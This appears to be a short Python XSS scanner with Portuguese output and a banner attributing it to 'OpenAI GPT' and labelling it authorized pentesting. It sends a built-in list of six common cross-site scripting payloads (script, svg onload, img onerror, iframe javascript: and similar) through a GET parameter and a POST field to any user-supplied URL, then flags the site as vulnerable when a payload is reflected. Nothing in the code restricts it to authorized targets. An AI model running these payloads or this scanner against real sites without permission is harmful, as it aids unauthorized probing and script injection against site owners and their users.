import requests
from urllib.parse import urlparse, urljoin
import re
import sys

# Payloads XSS comuns
payloads = [
    "<script>alert('XSS')</script>",
    "\"><svg/onload=alert('XSS')>",
    "'><img src=x onerror=alert('XSS')>",
    "\"><iframe src=javascript:alert('XSS')>",
    "\"><body onload=alert('XSS')>",
    "<svg><script>alert('XSS')</script>",
]

# Cores no terminal
def color(text, color_code):
    return f"\033[{color_code}m{text}\033[0m"

def banner():
    print(color("==== XSS Scanner (Python3) ====", "1;36"))
    print(color("Pentest autorizado | By OpenAI GPT", "1;33"))
    print()

def test_url(base_url):
    print(color("[+] Testando URL com payloads XSS:", "1;34"))
    for payload in payloads:
        test = f"{base_url}?test={payload}"
        try:
            response = requests.get(test, timeout=10)
            if payload in response.text:
                print(color(f"[VULNERÁVEL] -> {test}", "1;31"))
            else:
                print(color(f"[OK] -> {test}", "1;32"))
        except Exception as e:
            print(color(f"[ERRO] -> {test} | {e}", "1;31"))

def find_forms(url):
    try:
        resp = requests.get(url, timeout=10)
        forms = re.findall(r'<form.*?>', resp.text, re.IGNORECASE)
        return forms
    except:
        return []

def test_forms(url):
    forms = find_forms(url)
    if not forms:
        print(color("[!] Nenhum formulário detectado na página.", "1;33"))
        return

    print(color(f"[+] {len(forms)} formulário(s) encontrado(s), testando com payloads...", "1;34"))
    for form in forms:
        for payload in payloads:
            data = {'test': payload}
            try:
                resp = requests.post(url, data=data, timeout=10)
                if payload in resp.text:
                    print(color(f"[VULNERÁVEL] Formulário -> {url} -> Payload detectado!", "1;31"))
                else:
                    print(color(f"[OK] Formulário -> {url}", "1;32"))
            except Exception as e:
                print(color(f"[ERRO] -> {url} | {e}", "1;31"))

if __name__ == "__main__":
    banner()
    try:
        target = input(color("Digite a URL completa (ex: https://site.com): ", "1;35"))
        if not target.startswith("http"):
            print(color("[ERRO] URL inválida. Use http:// ou https://", "1;31"))
            sys.exit(1)
        test_url(target)
        test_forms(target)
        print(color("Teste finalizado!", "1;36"))
    except KeyboardInterrupt:
        print("\n" + color("Encerrado pelo usuário.", "1;31"))
